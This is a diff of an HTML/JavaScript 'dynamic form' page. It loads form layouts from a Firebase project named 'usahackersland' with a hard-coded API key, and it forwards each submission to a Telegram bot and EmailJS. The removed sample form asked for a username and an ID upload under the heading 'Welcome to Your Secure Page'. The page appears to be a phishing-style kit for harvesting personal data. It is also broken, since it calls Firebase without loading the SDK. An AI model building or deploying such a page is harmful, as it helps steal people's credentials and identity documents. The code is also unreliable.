@@ -1,142 +1,255 @@
 <!doctype html>
-
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
 <title>Dynamic Form</title>
 <style>
-body, html { margin:0; padding:0; font-family:Arial,sans-serif; background:#fff; }
-#dynamicFormContainer { position: relative; width: 100%; min-height: 100vh; overflow:auto; }
-.bgLayer { position:absolute; top:0; left:0; width:100%; height:100%; z-index:-1; overflow:hidden; }
-.bgLayer video, .bgLayer img { width:100%; height:100%; object-fit:cover; position:absolute; top:0; left:0; }
-.formContent { position:relative; z-index:1; width:100%; max-width: 960px; margin:0 auto; padding:20px; box-sizing:border-box; }
-.formContent img { display:block; margin:10px auto; border-radius:8px; max-width:100%; }
-.formContent h1 { text-align:center; margin:10px 0; }
-.formContent p { text-align:center; }
-.formField { margin:12px 0; display:flex; flex-direction:column; }
-.formField input, .formField textarea, .formField select { padding:10px; font-size:16px; border-radius:6px; border:1px solid #ccc; width:100%; box-sizing:border-box; }
-button.submitBtn { background:#1976d2; color:#fff; border:none; border-radius:8px; padding:12px; font-size:16px; cursor:pointer; margin-top:10px; }
-#generatedLink { margin-top:12px; color:#1976d2; font-weight:bold; }
-.draggable { position:absolute; cursor:move; }
+html, body {margin:0; padding:0; height:100%; width:100%; font-family: Arial, sans-serif;}
+body {overflow-x:hidden;}
+#formContainer {position:relative; width:100%; min-height:100vh; display:flex; justify-content:center; align-items:flex-start; padding:20px; box-sizing:border-box;}
+#dynamicForm {position:relative; width:100%; max-width:800px; background:rgba(255,255,255,0.85); padding:20px; border-radius:12px; box-sizing:border-box; z-index:2;}
+#dynamicForm img, #dynamicForm video, #dynamicForm iframe {max-width:100%; border-radius:6px; margin:6px 0; display:block;}
+#dynamicForm h2 {text-align:center; margin-bottom:8px;}
+#dynamicForm p {margin-bottom:8px;}
+#dynamicForm input, #dynamicForm textarea, #dynamicForm select {width:100%; padding:8px; margin:6px 0; border:1px solid #ccc; border-radius:6px; box-sizing:border-box;}
+#dynamicForm button {padding:12px; background:#1976d2; color:#fff; border:none; border-radius:8px; cursor:pointer; margin-top:10px;}
+#bgLayer {position:fixed; inset:0; z-index:-2; overflow:hidden;}
+#bgLayer video, #bgLayer img {width:100%; height:100%; object-fit:cover; position:absolute; top:0; left:0;}
+.dragging {opacity:0.7; cursor:grabbing;}
+#linkArea input {color:blue; font-weight:bold;}
 </style>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 </head>
-<body><div id="dynamicFormContainer">
-  <div class="bgLayer" id="bgLayer"></div>
-  <div class="formContent" id="formContent">
-    <h1 id="pageTitle"></h1>
-    <div id="avatarLogoBanner"></div>
-    <div id="descriptionText"></div>
-    <form id="dynamicForm"></form>
-    <div id="generatedLink"></div>
-  </div>
-</div><script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.5/axios.min.js"></script><script src="https://widget.cloudinary.com/v2.0/global/all.js" type="text/javascript"></script><script>
-const $ = id => document.getElementById(id);
+<body>
+<div id="bgLayer"></div>
+<div id="formContainer">
+  <form id="dynamicForm"></form>
+</div>
 
-// ==== CONFIG PLACEHOLDERS (replace with your Cloudinary/Telegram/Email) ====
-const CLOUDINARY_UPLOAD_PRESET = 'form_upload_preset';
-const CLOUDINARY_CLOUD_NAME = 'dymwisuau';
-const TELEGRAM_BOT_TOKEN = '<YOUR_BOT_TOKEN>';
-const TELEGRAM_CHAT_ID = '<YOUR_CHAT_ID>';
-const EMAIL_ALERT = '<YOUR_EMAIL>';
+<script>
+// --------------- CONFIG -----------------
+const $ = id=>document.getElementById(id);
+const urlParams = new URLSearchParams(location.search);
+const formId = urlParams.get("id");
 
-// ==== SAMPLE formConfig ====
-let formConfig = {
-  title: 'Welcome to Your Secure Page',
-  avatarURL: '',
-  logoURL: '',
-  bannerURL: '',
-  description: 'Please fill in your details below',
-  fields: [
-    { type:'text', name:'username', label:'Username' },
-    { type:'file', name:'idUpload', label:'Upload ID' }
-  ],
-  galleryImages: [],
-  videoLinks: [],
-  bgImageURL: '',
-  bgVideoURL: ''
+// Cloudinary
+const cloudName = "dymwisuau";
+const uploadPreset = "form_upload_preset";
+
+// Telegram
+const telegramBotToken = "<YOUR_BOT_TOKEN>";
+const telegramChatId = "<YOUR_CHAT_ID>";
+
+// EmailJS
+const emailServiceId = "YOUR_SERVICE_ID";
+const emailTemplateId = "YOUR_TEMPLATE_ID";
+const emailUserId = "YOUR_EMAILJS_USER_ID";
+
+// Firebase
+const firebaseConfig = {
+  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+  authDomain: "usahackersland.firebaseapp.com",
+  projectId: "usahackersland",
+  storageBucket: "usahackersland.appspot.com"
 };
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+const storage = firebase.storage();
 
-// ==== RENDER FORM ==== 
+let formConfig = null;
+
+// --------------- LOAD FORM -----------------
+if(!formId){
+  document.body.innerHTML="<h2>Form ID missing</h2>";
+} else {
+  db.collection("forms").doc(formId).get().then(doc=>{
+    if(!doc.exists){
+      document.body.innerHTML="<h2>Form not found</h2>";
+      return;
+    }
+    formConfig = doc.data();
+    renderForm();
+  });
+}
+
+// --------------- BACKGROUND -----------------
+function loadBackground(cfg){
+  const bgLayer = document.getElementById("bgLayer");
+  bgLayer.innerHTML = "";
+  if(cfg.bgVideoURL && cfg.bgVideoURL.trim()!==""){
+    if(cfg.bgVideoURL.includes("youtube")||cfg.bgVideoURL.includes("youtu.be")){
+      let id = cfg.bgVideoURL.split("v=")[1]||cfg.bgVideoURL.split("youtu.be/")[1];
+      if(id) id = id.split("&")[0];
+      const iframe = document.createElement("iframe");
+      iframe.src=`https://www.youtube.com/embed/${id}?autoplay=1&mute=1&loop=1&playlist=${id}&controls=0&modestbranding=1&showinfo=0&rel=0`;
+      iframe.style.width="100%"; iframe.style.height="100%";
+      iframe.style.position="absolute"; iframe.style.top="0"; iframe.style.left="0";
+      iframe.style.pointerEvents="none";
+      bgLayer.appendChild(iframe);
+    } else {
+      const video = document.createElement("video");
+      video.src = cfg.bgVideoURL; video.autoplay=true; video.muted=true; video.loop=true; video.playsInline=true;
+      bgLayer.appendChild(video);
+    }
+  } else if(cfg.bgImageURL && cfg.bgImageURL.trim()!==""){
+    const img = document.createElement("img"); img.src = cfg.bgImageURL;
+    bgLayer.appendChild(img);
+  }
+}
+
+// --------------- RENDER FORM -----------------
 function renderForm(){
-  // Clear form
-  $('dynamicForm').innerHTML='';
-  $('pageTitle').innerText = formConfig.title;
+  const form = $("dynamicForm");
+  form.innerHTML="";
 
-  // Avatar/Logo/Banner
-  const alb=$('avatarLogoBanner'); alb.innerHTML='';
-  [formConfig.avatarURL, formConfig.logoURL, formConfig.bannerURL].forEach(url=>{ if(url){ const img=document.createElement('img'); img.src=url; alb.appendChild(img); }});
+  // Title / Subtitle / Description
+  if(formConfig.title){
+    const h2 = document.createElement("h2"); h2.textContent=formConfig.title;
+    form.appendChild(h2);
+  }
+  if(formConfig.subtitle){
+    const sub = document.createElement("p"); sub.textContent=formConfig.subtitle;
+    form.appendChild(sub);
+  }
+  if(formConfig.description){
+    const desc = document.createElement("p"); desc.textContent=formConfig.description;
+    form.appendChild(desc);
+  }
 
-  // Description
-  $('descriptionText').innerHTML=formConfig.description ? `<p>${formConfig.description}</p>` : '';
-
-  // Fields
-  formConfig.fields.forEach(f=>{
-    const wrap=document.createElement('div'); wrap.className='formField';
-    if(f.label){ const lbl=document.createElement('label'); lbl.innerText=f.label; wrap.appendChild(lbl); }
-    let input;
-    if(f.type==='textarea'){ input=document.createElement('textarea'); } else { input=document.createElement('input'); input.type=f.type; }
-    input.name=f.name; wrap.appendChild(input);
-    $('dynamicForm').appendChild(wrap);
-
-    // Cloudinary Upload for files
-    if(f.type==='file'){ input.addEventListener('change', async e=>{
-      const file = e.target.files[0]; if(!file) return;
-      const formData = new FormData();
-      formData.append('file', file);
-      formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
-      const res = await axios.post(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/upload`, formData);
-      input.dataset.uploadedUrl = res.data.secure_url;
-    });
+  // Avatar, Logo, Banner
+  ["avatarURL","logoURL","bannerURL"].forEach(k=>{
+    if(formConfig[k]){
+      const img = document.createElement("img");
+      img.src=formConfig[k];
+      img.style.display="block";
+      img.style.margin="10px auto";
+      img.style.borderRadius=k==="avatarURL"?"50%":"6px";
+      form.appendChild(img);
+      makeDraggable(img);
     }
   });
 
-  // Submit button
-  const btn=document.createElement('button'); btn.type='button'; btn.className='submitBtn'; btn.innerText='Submit';
-  btn.onclick=submitForm;
-  $('dynamicForm').appendChild(btn);
-}
-
-// ==== BACKGROUND ====
-function loadBackground(){
-  const layer=$('bgLayer'); layer.innerHTML='';
-  if(formConfig.bgVideoURL){
-    const video=document.createElement('video');
-    video.src=formConfig.bgVideoURL;
-    video.autoplay=true; video.loop=true; video.muted=true; video.playsInline=true;
-    layer.appendChild(video);
-  } else if(formConfig.bgImageURL){
-    const img=document.createElement('img'); img.src=formConfig.bgImageURL; layer.appendChild(img);
+  // Gallery Images
+  if(formConfig.galleryImages){
+    formConfig.galleryImages.forEach(u=>{
+      const img = document.createElement("img"); img.src=u; form.appendChild(img);
+      makeDraggable(img);
+    });
   }
+
+  // Gallery Items
+  if(formConfig.galleryItems){
+    formConfig.galleryItems.forEach(item=>{
+      const wrapper=document.createElement("div"); wrapper.style.margin="8px 0";
+      const img=document.createElement("img"); img.src=item.img; wrapper.appendChild(img);
+      if(item.link && item.mask){
+        const a=document.createElement("a"); a.href=item.link; a.target="_blank"; a.textContent=item.mask; wrapper.appendChild(a);
+      }
+      if(item.desc){ const p=document.createElement("p"); p.textContent=item.desc; wrapper.appendChild(p);}
+      form.appendChild(wrapper);
+      makeDraggable(wrapper);
+    });
+  }
+
+  // Videos
+  if(formConfig.videoLinks){
+    formConfig.videoLinks.forEach(l=>{
+      let el;
+      if(l.endsWith(".mp4")||l.endsWith(".webm")){
+        el=document.createElement("video"); el.src=l; el.controls=true;
+      } else if(l.includes("youtube")||l.includes("youtu.be")){
+        let id=l.split("v=")[1]||l.split("youtu.be/")[1];
+        if(id) id=id.split("&")[0];
+        el=document.createElement("iframe"); el.src=`https://www.youtube.com/embed/${id}`; el.width="100%"; el.height=315;
+      }
+      if(el){ form.appendChild(el); makeDraggable(el); }
+    });
+  }
+
+  // Form Fields
+  if(formConfig.fields){
+    formConfig.fields.forEach(f=>{
+      let input=document.createElement(f.type==="textarea"?"textarea":"input");
+      input.type=f.type!=="textarea"?f.type:"";
+      input.name=f.name||"";
+      input.placeholder=f.placeholder||f.label||"";
+      form.appendChild(input);
+      makeDraggable(input);
+    });
+  }
+
+  // Submit Button
+  const btn=document.createElement("button"); btn.textContent=formConfig.buttonText||"Submit";
+  btn.addEventListener("click", submitForm);
+  form.appendChild(btn);
+
+  // Show generated link immediately
+  const linkArea=document.createElement("div"); linkArea.id="linkArea"; form.appendChild(linkArea);
+
+  loadBackground(formConfig);
 }
 
-// ==== SUBMIT FORM ====
-async function submitForm(){
+// --------------- DRAG -----------------
+function makeDraggable(el){
+  el.style.position="relative";
+  let offsetX=0, offsetY=0, dragging=false;
+  el.addEventListener("mousedown", e=>{
+    dragging=true; offsetX=e.offsetX; offsetY=e.offsetY; el.classList.add("dragging");
+  });
+  document.addEventListener("mousemove", e=>{
+    if(!dragging) return;
+    el.style.position="absolute"; el.style.left=(e.pageX-offsetX)+"px"; el.style.top=(e.pageY-offsetY)+"px";
+  });
+  document.addEventListener("mouseup", e=>{
+    if(dragging) { dragging=false; el.classList.remove("dragging"); }
+  });
+}
+
+// --------------- CLOUDINARY UPLOAD -----------------
+async function uploadFileToCloudinary(file){
+  const formData=new FormData();
+  formData.append("file",file);
+  formData.append("upload_preset",uploadPreset);
+  const res=await axios.post(`https://api.cloudinary.com/v1_1/${cloudName}/upload`, formData);
+  return res.data.secure_url;
+}
+
+// --------------- SUBMIT -----------------
+async function submitForm(e){
+  e.preventDefault();
   const data={};
-  document.querySelectorAll('#dynamicForm input, #dynamicForm textarea').forEach(i=>{
-    if(i.type==='file'){ data[i.name]=i.dataset.uploadedUrl || ''; }
-    else{ data[i.name]=i.value; }
+  document.querySelectorAll("#dynamicForm input, #dynamicForm textarea").forEach(i=>{
+    if(i.name) data[i.name]=i.value;
+  });
+  const docRef=await db.collection("submissions").add({
+    formId,
+    data,
+    createdAt:new Date()
   });
 
-  // Telegram placeholder
-  if(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID){
-    const msg = `New Form Submission:\n${JSON.stringify(data, null,2)}`;
-    // Send via Telegram (requires server proxy or CORS enabled endpoint)
+  // Telegram
+  if(telegramBotToken && telegramChatId){
+    const msg=`New submission on form ${formId}: ${JSON.stringify(data)}`;
+    axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {chat_id:telegramChatId, text:msg});
   }
 
-  // Email placeholder
-  if(EMAIL_ALERT){
-    // Send email using your backend or email service
+  // EmailJS
+  if(emailServiceId && emailTemplateId && emailUserId){
+    if(typeof emailjs!=="undefined") emailjs.send(emailServiceId,emailTemplateId,{formData:JSON.stringify(data)},emailUserId);
   }
 
-  // Display generated link immediately
-  const generatedLink = `${window.location.href}?data=${encodeURIComponent(JSON.stringify(data))}`;
-  $('generatedLink').innerHTML=`Form submitted! <a href='${generatedLink}' target='_blank' style='color:blue'>View Submission</a>`;
-  $('dynamicForm').reset();
+  alert("Form submitted!");
+  $("dynamicForm").reset();
+
+  // Show link immediately
+  const linkArea=$("linkArea");
+  const formLink=`${window.location.origin}/form.html?id=${docRef.id}`;
+  linkArea.innerHTML=`<p style="color:blue;">✅ Form submitted! Link: <a href="${formLink}" target="_blank">${formLink}</a></p>`;
 }
 
-// ==== INITIAL LOAD ====
-renderForm();
-loadBackground();
-</script></body>
+</script>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>emailjs.init("YOUR_EMAILJS_USER_ID");</script>
+</body>
 </html>
